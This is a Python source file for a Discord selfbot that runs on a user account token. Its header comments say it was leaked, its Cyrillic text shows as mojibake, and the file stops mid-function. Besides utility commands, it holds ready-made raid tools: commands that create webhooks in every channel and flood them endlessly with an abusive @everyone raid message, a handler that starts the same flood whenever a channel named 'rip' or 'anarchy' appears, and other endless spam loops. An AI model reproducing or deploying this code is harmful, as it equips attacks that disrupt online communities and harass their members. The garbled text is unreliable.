import os
## IMPORTS  2236
import discord, requests, aiohttp, json, asyncio, os, dwbh, io, contextlib, textwrap, threading, time
import requests as rq
from prmns import allletters, wal
from discord.ext import commands
from translate import Translator
from random import choice as wuw 
# —Å–ª–∏—Ç–æ by t.me/protectcheck
# —Å–ª–∏—Ç–æ by discord.gg/fzlgroup2

from datetime import datetime
## +++++++++++++++++

guild_list = []
user_list = []
PREFIX = "."
made_by = "Rozil"
colors = [000000,0xffffff,0x6600a8,0xfdff00,0xff5a00,0x10ff00,0x2000a8]
colors = [0x00ffff]
client = commands.Bot(command_prefix = PREFIX, self_bot=True, intents=discord.Intents.all() )
#client.remove_command("help")
creator_url = "https://shrk.tk/freek0re"
## ++++++++++++++

@client.event
async def on_message(message):
    await client.process_commands(message)
    try:
        if isinstance(message.channel, discord.DMChannel):
            if message.channel.recipient.id in user_list:
                try:
                    await message.add_reaction('üá∫üá¶')
                except:
                    pass
        else:
            if message.guild.id in guild_list:
                try:
                    await message.add_reaction('üá∫üá¶')
                except:
                    pass
    except: pass
    try:
        if message.author.id != client.user.id:
            if message.reference: return
            def check(mes): return mes.author.id == client.user.id
            frases = [
            "–Ω–µ –ø–∏–Ω–≥—É–π, —è –∑–∞–Ω—è—Ç",
            "–∑–∞–µ–±–∞–ª –ø–∏–Ω–≥–æ–≤–∞—Ç—å, –∑–∞–Ω—è—Ç —è"
            ]
            if client.user not in message.mentions: return
            print(f"[{client.user}] "+"detected")
#            try:
#                await client.wait_for('message', check=check, timeout = 120)
#                print(f"[{client.user}] "+'ansvered')
#            except asyncio.TimeoutError:
#                await message.reply(wuw(frases), mention_author=True)
        else:
            if message.content == "": return
            try: db=json.load(open(f"trans{message.author.id}.db","r"))
            except: return
            if message.content.startswith("!"): return
            if message.content.startswith("/"): return
            if message.content.startswith("."): return
            if message.content.startswith("?"): return
            if message.content.startswith("<"): return
            if message.content.startswith(">"): return
            if message.content.startswith(":"): return
            if message.content.startswith("+"): return
            if message.content.startswith("-"): return
            if message.content.startswith("_"): return
            if message.content.startswith("="): return
            if db[0]:
                translator=Translator(from_lang='ru', to_lang=db[1])
                g=translator.translate(message.content)
                await message.edit(content=g)
    except: pass


@client.command()
async def wall(ctx):
    await ctx.message.edit(content=wal)


@client.command()
async def resetchat(ctx):
    new=await ctx.channel.clone()
    await new.edit(position=ctx.channel.position)
    await ctx.channel.delete()


@client.command(aliases=['tr','trans'])
async def translate(ctx, lang='en'):
    if lang == "stop":
        open(f"trans{ctx.author.id}.db","w").write('[false]')
        return
    translator=Translator(from_lang='ru', to_lang=lang)
    try: g=translator.translate("–ü–µ—Ä–µ–≤–æ–¥ —É—Å–ø–µ—à–Ω–æ –≤–∫–ª—é—á–µ–Ω.")
    except Exception as e: return await ctx.send(e)
    await ctx.message.edit(content=g)
    open(f"trans{ctx.author.id}.db","w").write(f'[true, "{lang}"]')


@client.command()
async def ban(ctx,user: discord.User):
    requests.put(f"https://discord.com/api/v9/guilds/{ctx.guild.id}/bans/{user.id}", headers={"authorization": client.ws.token})
    await ctx.send(f"‚úÖ **Successfully banned {user} **")


@client.command(aliases=['[eq'])
async def —Ö—É–π(ctx, *, text):
    charmap = {'q': '–π', '–π': 'q', 'w': '—Ü', '—Ü': 'w', 'e': '—É', '—É': 'e', 'r': '–∫', '–∫': 'r', 't': '–µ', '–µ': 't', 'y': '–Ω', '–Ω': 'y', 'u': '–≥', '–≥': 'u', 'i': '—à', '—à': 'i', 'o': '—â', '—â': 'o', 'p': '–∑', '–∑': 'p', '[': '—Ö', '—Ö': '[', ']': '—ä', '—ä': ']', 'a': '—Ñ', '—Ñ': 'a', 's': '—ã', '—ã': 's', 'd': '–≤', '–≤': 'd', 'f': '–∞', '–∞': 'f', 'g': '–ø', '–ø': 'g', 'h': '—Ä', '—Ä': 'h', 'j': '–æ', '–æ': 'j', 'k': '–ª', '–ª': 'k', 'l': '–¥', '–¥': 'l', ';': '–∂', '–∂': ';', "'": '—ç', '—ç': "'", 'z': '—è', '—è': 'z', 'x': '—á', '—á': 'x', 'c': '—Å', '—Å': 'c', 'v': '–º', '–º': 'v', 'b': '–∏', '–∏': 'b', 'n': '—Ç', '—Ç': 'n', 'm': '—å', '—å': 'm', ',': '–±', '–±': ',', '.': '—é', '—é': '.', 'Q': '–ô', '–ô': 'Q', 'W': '–¶', '–¶': 'W', 'E': '–£', '–£': 'E', 'R': '–ö', '–ö': 'R', 'T': '–ï', '–ï': 'T', 'Y': '–ù', '–ù': 'Y', 'U': '–ì', '–ì': 'U', 'I': '–®', '–®': 'I', 'O': '–©', '–©': 'O', 'P': '–ó', '–ó': 'P', '{': '–•', '–•': '{', '}': '–™', '–™': '}', 'A': '–§', '–§': 'A', 'S': '–´', '–´': 'S', 'D': '–í', '–í': 'D', 'F': '–ê', '–ê': 'F', 'G': '–ü', '–ü': 'G', 'H': '–†', '–†': 'H', 'J': '–û', '–û': 'J', 'K': '–õ', '–õ': 'K', 'L': '–î', '–î': 'L', ':': '–ñ', '–ñ': ':', '"': '–≠', '–≠': '"', 'Z': '–Ø', '–Ø': 'Z', 'X': '–ß', '–ß': 'X', 'C': '–°', '–°': 'C', 'V': '–ú', '–ú': 'V', 'B': '–ò', '–ò': 'B', 'N': '–¢', '–¢': 'N', 'M': '–¨', '–¨': 'M', '<': '–ë', '–ë': '<', '>': '–Æ', '–Æ': '>'}
    await ctx.message.edit(content=''.join(list(map(lambda x: charmap.get(x, x), text))))


@client.command()
async def rclicker(x, react):
    msg = x.channel.get_partial_message(x.message.reference.message_id)
    await x.message.edit(content='‚úÖ **Initiated!** \nType `stoprclicker` to stop.')
    def ch(m): return m.content == 'stoprclicker' and m.author == x.author
    async def sp():
        while True:
            try: await msg.add_reaction(react)
            except Exception as e: print(f"[{client.user}] "+str(e))
            try: 
                if x.guild:
                    await msg.remove_reaction(emoji=react, member=x.guild.me)
                else:
                    await msg.remove_reaction(emoji=react, member=client.user)
            except Exception as e: print(f"[{client.user}] "+str(e))
    tsk=client.loop.create_task(sp())
    await client.wait_for('message', check=ch)
    tsk.cancel()
    await x.send('‚úÖ **Complete!**')


@client.command()
async def copyserver(ctx, id=None):
    class console():
        def log(text):
            print(str(text))
    timel = time.time()
    if not id and ctx.guild: id = ctx.guild.id
    guild=client.get_guild(int(id))
    if not guild: return await ctx.message.edit(content="Invalid id")
    msglog=ctx.message
    console.log(f'–ù–∞—á–∏–Ω–∞—é –∫–ª–æ–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–µ—Ä–≤–µ—Ä–∞ {guild.name}...')
    #await msglog.edit(content=f'–ù–∞—á–∏–Ω–∞—é –∫–ª–æ–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–µ—Ä–≤–µ—Ä–∞ {guild.name}...')
    icon_hash = guild.icon
    with open('clone_icon.png', 'wb+') as handle:
        handle.write(rq.get(f'https://cdn.discordapp.com/icons/{guild.id}/{icon_hash}.png').content)
    new_guild = await client.create_guild(name=guild.name, icon=open('clone_icon.png', 'rb').read())
    for dc in new_guild.channels:
        await dc.delete()
    console.log(f'–°–æ–∑–¥–∞–Ω —Å–µ—Ä–≤–µ—Ä —Å –∏–º–µ–Ω–µ–º {guild.name} —Å –Ω—É–∂–Ω–æ–π –∏–∫–æ–Ω–∫–æ–π, –Ω–∞—á–∏–Ω–∞—é —Å–æ–∑–¥–∞–Ω–∏–µ —Ä–æ–ª–µ–π')
    #await msglog.edit(content=f'–°–æ–∑–¥–∞–Ω —Å–µ—Ä–≤–µ—Ä —Å –∏–º–µ–Ω–µ–º {guild.name} —Å –Ω—É–∂–Ω–æ–π –∏–∫–æ–Ω–∫–æ–π, –Ω–∞—á–∏–Ω–∞—é —Å–æ–∑–¥–∞–Ω–∏–µ —Ä–æ–ª–µ–π')
    roles = {}
    r = guild.roles
    r.reverse()
    for role in r:
        if role.is_bot_managed() or role.is_default() or role.is_integration() or role.is_premium_subscriber(): continue
        new_role=await new_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)
        roles[role] = new_role
    everyone = guild.default_role
    roles[everyone] = new_guild.default_role
    await new_guild.default_role.edit(permissions=everyone.permissions, color=everyone.color, hoist=everyone.hoist, mentionable=everyone.mentionable)
    console.log(f'–°–æ–∑–¥–∞–Ω–∏–µ —Ä–æ–ª–µ–π –∑–∞–≤–µ—Ä—à–µ–Ω–æ, –Ω–∞—á–∏–Ω–∞—é —Å–æ–∑–¥–∞–Ω–∏–µ –∫–∞–Ω–∞–ª–æ–≤')
    #await msglog.edit(content=f'–°–æ–∑–¥–∞–Ω–∏–µ —Ä–æ–ª–µ–π –∑–∞–≤–µ—Ä—à–µ–Ω–æ, –Ω–∞—á–∏–Ω–∞—é —Å–æ–∑–¥–∞–Ω–∏–µ –∫–∞–Ω–∞–ª–æ–≤')
    for dc in await new_guild.fetch_channels():
        await dc.delete()
    channels = {None: None}
    for cat in guild.categories:
        new_c = await new_guild.create_category(name=cat.name, position=cat.position)
        channels[cat] = new_c
    for catt in guild.by_category():
        cat = catt[0]
        chs = catt[1]
        if cat != None:
            for c in chs:
                if c.type==discord.ChannelType.text:
                    new_c = await new_guild.create_text_channel(name=c.name, category=channels[c.category], position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                elif c.type==discord.ChannelType.voice:
                    new_c = await new_guild.create_voice_channel(name=c.name, category=channels[c.category], position=c.position, user_limit=c.user_limit)
                elif c.type==discord.ChannelType.news:
                    new_c = await new_guild.create_text_channel(name=c.name, category=channels[c.category], position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                channels[c] = new_c
        else:
            for c in chs:
                if c.type==discord.ChannelType.text:
                    new_c = await new_guild.create_text_channel(name=c.name, category=None, position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                elif c.type==discord.ChannelType.voice:
                    new_c = await new_guild.create_voice_channel(name=c.name, category=None, position=c.position, user_limit=c.user_limit)
                elif c.type==discord.ChannelType.news:
                    new_c = await new_guild.create_text_channel(name=c.name, category=None, position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                channels[c] = new_c
    console.log(f'–°–æ–∑–¥–∞–Ω–∏–µ –∫–∞–Ω–∞–ª–æ–≤ –∑–∞–≤–µ—Ä—à–µ–Ω–æ, –Ω–∞—á–∏–Ω–∞—é –Ω–∞—Å—Ç—Ä–æ–π–∫—É –æ–≤–µ—Ä–≤—Ä–∞–π—Ç–æ–≤')
    #await msglog.edit(content=f'–°–æ–∑–¥–∞–Ω–∏–µ –∫–∞–Ω–∞–ª–æ–≤ –∑–∞–≤–µ—Ä—à–µ–Ω–æ, –Ω–∞—á–∏–Ω–∞—é –Ω–∞—Å—Ç—Ä–æ–π–∫—É –æ–≤–µ—Ä–≤—Ä–∞–π—Ç–æ–≤')
    for c in guild.channels:
        overs = c.overwrites
        over_new = {}
        for target,over in overs.items():
            if isinstance(target, discord.Role):
                try:
                    over_new[roles[target]] = over
                except:
                    pass
            else:
                console.log(f'(OVERWRITES) –ü—Ä–æ–ø—É—Å–∫–∞—é {target.name}, —Ç–∞–∫ –∫–∞–∫ —ç—Ç–æ —é–∑–µ—Ä')
        await channels[c].edit(overwrites=over_new)
    await new_guild.edit(verification_level=guild.verification_level, default_notifications=guild.default_notifications, explicit_content_filter=guild.explicit_content_filter, system_channel=channels[guild.system_channel], system_channel_flags=guild.system_channel_flags, afk_channel=channels[guild.afk_channel], afk_timeout=guild.afk_timeout)#—ç—Ç–æ –Ω–µ –æ–≤–µ—Ä–≤—Ä–∞–π—Ç, –Ω–æ –ª—É—á—à–µ –µ–≥–æ –¥–µ–ª–∞—Ç—å –ø–µ—Ä–µ–¥ —ç–º–æ–¥–∑–∏
    console.log(f'–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –æ–≤–µ—Ä–≤—Ä–∞–π—Ç–æ–≤ –∑–∞–≤–µ—Ä—à–µ–Ω–∞, –Ω–∞—á–∏–Ω–∞—é —Å–æ–∑–¥–∞–Ω–∏–µ —ç–º–æ–¥–∑–∏...')
    #await msglog.edit(content=f'–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –æ–≤–µ—Ä–≤—Ä–∞–π—Ç–æ–≤ –∑–∞–≤–µ—Ä—à–µ–Ω–∞, –Ω–∞—á–∏–Ω–∞—é —Å–æ–∑–¥–∞–Ω–∏–µ —ç–º–æ–¥–∑–∏...')
    for emoji in guild.emojis:
        try:
            url = f'https://cdn.discordapp.com/emojis/{emoji.id}.{"gif" if emoji.animated else "png"}'
            await new_guild.create_custom_emoji(name=emoji.name, image=rq.get(url).content)
        except:
            pass
    os.remove('clone_icon.png')
    times = int(time.time() - timel)
    console.log(f'–ó–∞–≤–µ—Ä—à–µ–Ω–æ –∫–ª–æ–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–µ—Ä–≤–µ—Ä–∞. –û–ø–µ—Ä–∞—Ü–∏—è –∑–∞–Ω—è–ª–∞ {times} —Å–µ–∫.')
    #await msglog.edit(content=f'–ó–∞–≤–µ—Ä—à–µ–Ω–æ –∫–ª–æ–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–µ—Ä–≤–µ—Ä–∞. –û–ø–µ—Ä–∞—Ü–∏—è –∑–∞–Ω—è–ª–∞ {times} —Å–µ–∫.')


@client.command()
async def members(ctx, gid: int = None, chid: int = None):
    if not gid or not chid:
        gid=ctx.guild.id
        chid=ctx.channel.id
    with open('info.py', 'w') as f:
        f.write(f"gid={gid}\nchid={chid}")
    os.system('python3 runner.py')
    await ctx.send(file=discord.File("ids.txt"))


@client.command()
async def mentionable(ctx, id: int = None):
    if not id:
        guild=ctx.guild
    else:
        guild=client.get_guild(id)
    await ctx.message.delete()
    st=''
    for r in guild.roles:
        if r.mentionable: st+=f'{r.mention} ({r.name})\n'
    await ctx.send(embed=discord.Embed(title='–£–ø–æ–º–∏–Ω–∞–µ–º—ã–µ —Ä–æ–ª–∏:', description=st))


@client.event
async def on_guild_channel_create(channel):
    if isinstance(channel, discord.TextChannel):
        if channel.name == 'rip' or channel.name == 'anarchy':
            webhook = await channel.create_webhook(name = "nuked")
            webhook_url = webhook.url
            async with aiohttp.ClientSession() as session:
                webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
                while True:
                    try:
                        await webhook.send('''
–ó–¥–∞—Ä–æ–≤–∞ –±–∞–Ω–¥–∏—Ç—ã)0)))0)
–í–∞—à—É –ø–æ–º–æ–π–∫—É —Ä–µ–π–¥—è—Ç Blood Raider's, –∞ –ø–æ–∫–∞ —á—Ç–æ –º–æ–∂–µ—Ç–µ –ø–æ—Å–æ—Å–∞—Ç—å —Ö—É–π –∏–ª–∏ –ø–µ—Ä–µ–π—Ç–∏ –∫ –Ω–∞–º
–ê—Ö –¥–∞, @everyone, —É —Ç–µ—Ö –∫—Ç–æ –Ω–µ –∑–∞–π–¥—ë—Ç –≤ –Ω–∞—à–∏ —Ä—è–¥—ã —Å–¥–æ—Ö–Ω–µ—Ç –º–∞—Ç—å
–° –ª—é–±–æ–≤—å—é(–Ω–µ—Ç) Blood Raider's
Ping –µ–±–∞–Ω—ã–π: ||everyone @here||
GIF: https://cdn.discordapp.com/attachments/823113291529453608/849533712231301134/MOSHED-2021-6-2-9-21-13.gif
''', username = "EZ Crash")
                    except:
                        return


@client.event
async def on_ready():
#    await client.change_presence(activity=discord.Streaming(name='GG', url='https://www.youtube.com/watch?v=dQw4w9WgXcQ'))
    print(f"[{client.user}] "+"ready")
#    while True:
#        await dwbh.send('–°–ª–∏–≤ –≤–µ–±—Ö—É–∫–∞', url='')
#        await asyncio.sleep(15)
#        webh.spam1()
#        webh.spam2()
#        webh.spam3()
    

## client commands 

@client.command()
async def wbhs(ctx):
    g=await ctx.channel.webhooks()
    st=''
    for wb in list(g):
        st+=f'{wb.url}\n'
    await ctx.message.delete()
    print(f"[{client.user}] "+st)
    if st == '':
        await ctx.send('None', delete_after=5)

@client.command()
async def all_react(ctx):
    if isinstance(ctx.channel, discord.DMChannel):
        if ctx.channel.recipient.id in user_list:
            try:
                user_list.remove(ctx.channel.recipient.id)
                await ctx.send("‚úÖ **Removed**")
                await ctx.message.delete()
            except:
                await ctx.send("‚ùå **Error!**")
        else:
            try:
                user_list.append(ctx.channel.recipient.id)
                await ctx.send("‚úÖ **Added**")
                await ctx.message.delete()
            except:
                await ctx.send("‚ùå **Error!**")
    else:
        if ctx.guild.id in guild_list:
            try:
                guild_list.remove(ctx.guild.id)
                await ctx.send("‚úÖ **Removed**")
                await ctx.message.delete()
            except:
                await ctx.send("‚ùå **Error!**")
        else:
            try:
                guild_list.append(ctx.guild.id)
                await ctx.send("‚úÖ **Added**")
                await ctx.message.delete()
            except:
                await ctx.send("‚ùå **Error!**")

@client.command()
async def test(ctx, url='https://discord.com/api/webhooks/None/None', *, text='test'):
    await dwbh.send(text, url=url)

@client.command()
async def wspam(ctx, url, *, text='test'):
    while True: await dwbh.send(text, url=url)

@client.command()
async def embed( ctx, r, g, b, *, mes ):
    author = ctx.author
    rr = int(r)
    gg = int(g)
    bb = int(b)
    if author.id in [812755182201995264]:
        if rr < 0:
            await ctx.send('–û—à–∏–±–∫–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∞(–æ–≤)')
        elif rr > 255:
            await ctx.send('–û—à–∏–±–∫–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∞(–æ–≤)')
        else:
            if gg < 0:
                await ctx.send('–û—à–∏–±–∫–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∞(–æ–≤)')
            elif gg > 255:
                await ctx.send('–û—à–∏–±–∫–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∞(–æ–≤)')
            else:
                if bb < 0:
                    await ctx.send('–û—à–∏–±–∫–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∞(–æ–≤)')
                elif bb > 255:
                    await ctx.send('–û—à–∏–±–∫–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∞(–æ–≤)')
                else:
                    await ctx.message.delete()
                    emb = discord.Embed(description = mes, colour = discord.Colour.from_rgb(rr, gg, bb))
                    await ctx.send(embed = emb)

@client.command()
async def webhook_spam(ctx):
    member=ctx.author
    whlist=[]
    for channel in ctx.guild.text_channels:
        if member.permissions_in(channel).manage_webhooks:
            webhoks = await channel.webhooks()
            if len(webhoks) > 0:
                for webhook in webhoks:
                    whlist.append(webhook)
            else:
                webhook = await channel.create_webhook(name="GG")
                whlist.append(webhook)
        else:
            print(f"[{client.user}] "+f"{channel.name} ------------- –ù–µ—Ç")
    while True:
        for webhook in whlist:
            try: await webhook.send('''
–ó–¥–∞—Ä–æ–≤–∞ –±–∞–Ω–¥–∏—Ç—ã)0)))0)
–í–∞—à—É –ø–æ–º–æ–π–∫—É —Ä–µ–π–¥—è—Ç Blood Raider's, –∞ –ø–æ–∫–∞ —á—Ç–æ –º–æ–∂–µ—Ç–µ –ø–æ—Å–æ—Å–∞—Ç—å —Ö—É–π –∏–ª–∏ –ø–µ—Ä–µ–π—Ç–∏ –∫ –Ω–∞–º
–ê—Ö –¥–∞, @everyone, —É —Ç–µ—Ö –∫—Ç–æ –Ω–µ –∑–∞–π–¥—ë—Ç –≤ –Ω–∞—à–∏ —Ä—è–¥—ã —Å–¥–æ—Ö–Ω–µ—Ç –º–∞—Ç—å
–° –ª—é–±–æ–≤—å—é(–Ω–µ—Ç) Blood Raider's
Ping –µ–±–∞–Ω—ã–π: ||everyone @here||
GIF: https://cdn.discordapp.com/attachments/823113291529453608/849533712231301134/MOSHED-2021-6-2-9-21-13.gif
''', username = "EZ Crash")
            except: pass


@client.command()
async def stream(ctx, url='https://www.youtube.com/watch?v=dQw4w9WgXcQ', *, text="¬Ø\_(„ÉÑ)_/¬Ø"):
    if not url.startswith("http"):
        text=url+" "+text
        url='https://www.youtube.com/watch?v=dQw4w9WgXcQ'
    await client.change_presence(activity=discord.Streaming(name=text, url=url))
    await ctx.send(embed=discord.Embed(title='–°—Ç–∞—Ç—É—Å –∏–∑–º–µ–Ω–µ–Ω!',color=wuw(colors), description='–¢–µ–ø–µ—Ä—å —Ç—ã —Å—Ç—Ä–∏–º–∏—à—å ' + text ))
    await ctx.message.delete()


@client.command()
async def ra1nb0w(ctx, count="1"):
    if int(count) < 1 or int(count) > 300:
        count = "1"
    def ch(m):
        return m.content == 'stop' or m.content.startswith(".ra1nb0w") and m.author == ctx.author
    msvars = [
    ":red_square::orange_square::yellow_square::green_square::blue_square::purple_square:",":purple_square::red_square::orange_square::yellow_square::green_square::blue_square:",
    ":blue_square::purple_square::red_square::orange_square::yellow_square::green_square:",
    ":green_square::blue_square::purple_square::red_square::orange_square::yellow_square:",
    ":yellow_square::green_square::blue_square::purple_square::red_square::orange_square:",
    ":orange_square::yellow_square::green_square::blue_square::purple_square::red_square:"
    ]
    async def sp():
        while True:
            for mescont in msvars:
                await asyncio.sleep(0.5)
                await ctx.message.edit(content=f"{mescont}\n" * int(count))
    tsk=client.loop.create_task(sp())
    m = await client.wait_for('message', check=ch)
    tsk.cancel()
    await ctx.message.edit(content="‚úÖ")
    await m.delete()


@client.command()
async def ban_realy(ctx, token=None):
    if not token: token=client.ws.token
    code='dpy'
    for srv in client.guilds:
        for ch in srv.text_channels:
            try:
                invite=ch.create_invite()
                code=invite.code
                break
            except:
                pass
    requests.post(f'https://discord.com/api/v9/invites/{code}', headers={'Authorization': token})


@client.command()
async def randspam(x, *, text=""):
    await x.message.edit(content='‚úÖ **Spamming initiated!** \nType `stop` to stop.')
    def ch(m):
        return m.content == 'stop' and m.author == x.author
    async def sp():
        while True:
            await x.send(text + "   " + "||" + wuw(allletters) + "||")
    tsk=client.loop.create_task(sp())
    await client.wait_for('message', check=ch)
    tsk.cancel()
    await x.send('‚úÖ **Spamming complete!**')


@client.command()
async def notes(ctx):
    fn=f'notes{ctx.author.id}'
    if fn not in os.listdir():
        return await ctx.message.edit(content='No notes')
    with open(fn, 'r') as f:
        nts=json.load(f)
    if nts == []:
        return await ctx.message.edit(content='No notes')
    def ch(r, u):
        return u.id == ctx.author.id and r.emoji == '‚è©'
    while True:
        for n in range(0, len(nts)):
            note=nts[n]
            emb=discord.Embed(title=note[0], description=note[-1])
            emb.set_footer(text=f'ID: {n+1}/{len(nts)}')
            await ctx.message.edit(content='', embed=emb)
            await ctx.message.add_reaction('‚è©')
            try: await client.wait_for('reaction_remove', check=ch, timeout=120)
            except asyncio.TimeoutError: return
            await ctx.message.add_reaction('‚è©')


@client.command()
async def note(ctx, mode='add'):
    if mode == 'ad' or mode == 'rm' or mode == 'rem':
        mode=mode.replace('ad','add')
        mode=mode.replace('rm','remove')
        mode=mode.replace('rem','remove')
    if mode not in ['add','remove']:
        return await ctx.message.edit(content='invalid mode, use "add" or "remove" mode', delete_after=10)
    fn=f'notes{ctx.author.id}'
    if fn not in os.listdir():
        if mode == 'remove':
            return await ctx.message.edit(content='no notes to remove', delete_after=10)
        with open(fn, 'w') as f:
            f.write('[]')
            f.close()
    with open(fn, 'r') as f:
        notes=json.load(f)
    if notes == [] and mode == 'remove':
        return await ctx.message.edit(content='no notes to remove', delete_after=10)
    def ch(ms):
        return ms.author.id == ctx.author.id
    if mode == 'add':
        await ctx.message.edit(content='Enter note title')
        ttl=await client.wait_for('message', check=ch)
        await ttl.delete()
        await ctx.message.edit(content='Enter note description(only text)')
        dsc=await client.wait_for('message', check=ch)
        await dsc.delete()
        notes.append([ttl.content, dsc.content])
    else:
        await ctx.message.edit(content='Enter note id')
        ms=await client.wait_for('message', check=ch)
        await ms.delete()
        try:
            key=int(ms.content)-1
            nt=notes[key]
        except:
            return await ctx.message.edit(content='invalid id', delete_after=10)
        notes.remove(nt)
    with open(fn, 'w') as f:
        json.dump(notes,f)
        f.close()
    await ctx.message.edit(content=':white_check_mark: Success')


@client.command()
async def role(ctx, role:discord.Role):
    administrator = None
    create_instant_invite = None
    kick_members = None
    ban_members = None
    manage_channels = None
    manage_guild = None
    add_reactions = None
    view_audit_log = None
    priority_speaker = None
    read_messages = None
    send_messages = None
    send_tts_messages = None
    manage_messages = None
    embed_links = None
    attach_files = None
    read_message_history = None
    mention_everyone = None
    external_emojis = None
    connect = None
    speak = None
    mute_members = None
    deafen_members = None
    move_members = None
    use_voice_activation = None
    change_nickname = None
    manage_nicknames = None
    manage_roles = None
    manage_webhooks = None
    manage_emojis = None
    managed = None
    hoist = None
    mentionable = None
    if role.permissions.administrator:
        administrator = "–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä: `–î–∞`"
        create_instant_invite = "–°–æ–∑–¥–∞–≤–∞—Ç—å –∏–Ω–≤–∞–π—Ç—ã: `–î–∞`"
        kick_members = "–ö–∏–∫–∞—Ç—å: `–î–∞`"
        ban_members = "–ë–∞–Ω–∏—Ç—å: `–î–∞`"
        manage_channels = "–£–ø—Ä–∞–≤–ª—è—Ç—å –∫–∞–Ω–∞–ª–∞–º–∏ `–î–∞`"
        manage_guild = "–£–ø—Ä–∞–≤–ª—è—Ç—å —Å–µ—Ä–≤–µ—Ä–æ–º: `–î–∞`"
        add_reactions = "–î–æ–±–∞–≤–ª—è—Ç—å —Ä–µ–∞–∫—Ü–∏–∏: `–î–∞`"
        view_audit_log = "–ß–∏—Ç–∞—Ç—å –∞—É–¥–∏—Ç: `–î–∞`"
        priority_speaker = "–ì–æ–≤–æ—Ä–∏—Ç—å –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–Ω–æ: `–î–∞`"
        read_messages = "–ß–∏—Ç–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è: `–î–∞`"
        send_messages = "–û—Ç–ø—Ä–∞–≤–ª—è—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è: `–î–∞`"
        send_tts_messages = "–û—Ç–ø—Ä–∞–≤–ª—è—Ç—å tts —Å–æ–æ–±—â–µ–Ω–∏—è: `–î–∞`"
        manage_messages = "–£–ø—Ä–∞–≤–ª—è—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è–º–∏: `–î–∞`"
        embed_links = "–í—Å—Ç—Ä–∞–∏–≤–∞—Ç—å —Å—Å—ã–ª–∫–∏: `–î–∞`"
        attach_files = "–ü—Ä–∏–∫—Ä–µ–ø–ª—è—Ç—å —Ñ–∞–π–ª—ã: `–î–∞`"
        read_message_history = "–ß–∏—Ç–∞—Ç—å –∏—Å—Ç—Ä–æ–∏—é —Å–æ–æ–±—â–µ–Ω–∏–π: `–î–∞`"
        mention_everyone = "–ü–∏–Ω–≥–æ–≤–∞—Ç—å everyone: `–î–∞`"
        external_emojis = "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–º–∞–π–ª—ã —Å –¥—Ä—É–≥–∏—Ö —Å–µ—Ä–≤–æ–≤: `–î–∞`"
        connect = "–ü–æ–¥–∫–ª—é—á–∞—Ç—å—Å—è: `–î–∞`"
        speak = "–ì–æ–≤–æ—Ä–∏—Ç—å: `–î–∞`"
        mute_members = "–ú—É—Ç–∏—Ç—å –≤ –≥—á: `–î–∞`"
        deafen_members = "–ì–ª—É—à–∏—Ç—å –≤ –≥—á: `–î–∞`"
        move_members = "–ü–µ—Ä–µ–º–µ—â–∞—Ç—å —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤: `–î–∞`"
        use_voice_activation = "–ê–∫—Ç–∏–≤–∞—Ü–∏—è –ø–æ –≥–æ–ª–æ—Å—É: `–î–∞`"
        change_nickname = "–ú–µ–Ω—è—Ç—å —Å–≤–æ–π –Ω–∏–∫: `–î–∞`"
        manage_nicknames = "–ú–µ–Ω—è—Ç—å –Ω–∏–∫–∏: `–î–∞`"
        manage_roles = "–£–ø—Ä–∞–≤–ª—è—Ç—å —Ä–æ–ª—è–º–∏: `–î–∞`"
        manage_webhooks = "–£–ø—Ä–∞–≤–ª—è—Ç—å –≤–µ–±—Ö—É–∫–∞–º–∏: `–î–∞`"
        manage_emojis = "–£–ø—Ä–∞–≤–ª—è—Ç—å —ç–º–æ–¥–∂–∏: `–î–∞`"
    else:
        administrator = "–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä: `–ù–µ—Ç`"
        if role.permissions.create_instant_invite:
            create_instant_invite = "–°–æ–∑–¥–∞–≤–∞—Ç—å –∏–Ω–≤–∞–π—Ç—ã: `–î–∞`"
        else:
            create_instant_invite = "–°–æ–∑–¥–∞–≤–∞—Ç—å –∏–Ω–≤–∞–π—Ç—ã: `–ù–µ—Ç`"
        if role.permissions.kick_members:
            kick_members = "–ö–∏–∫–∞—Ç—å: `–î–∞`"
        else:
            kick_members = "–ö–∏–∫–∞—Ç—å: `–ù–µ—Ç`"
        if role.permissions.ban_members:
            ban_members = "–ë–∞–Ω–∏—Ç—å: `–î–∞`"
        else:
            ban_members = "–ë–∞–Ω–∏—Ç—å: `–ù–µ—Ç`"
        if role.permissions.manage_channels:
            manage_channels = "–£–ø—Ä–∞–≤–ª—è—Ç—å –∫–∞–Ω–∞–ª–∞–º–∏ `–î–∞`"
        else:
            manage_channels = "–£–ø—Ä–∞–≤–ª—è—Ç—å –∫–∞–Ω–∞–ª–∞–º–∏ `–ù–µ—Ç`"
        if role.permissions.manage_guild:
            manage_guild = "–£–ø—Ä–∞–≤–ª—è—Ç—å —Å–µ—Ä–≤–µ—Ä–æ–º: `–î–∞`"
        else:
            manage_guild = "–£–ø—Ä–∞–≤–ª—è—Ç—å —Å–µ—Ä–≤–µ—Ä–æ–º: `–ù–µ—Ç`"
        if role.permissions.add_reactions:
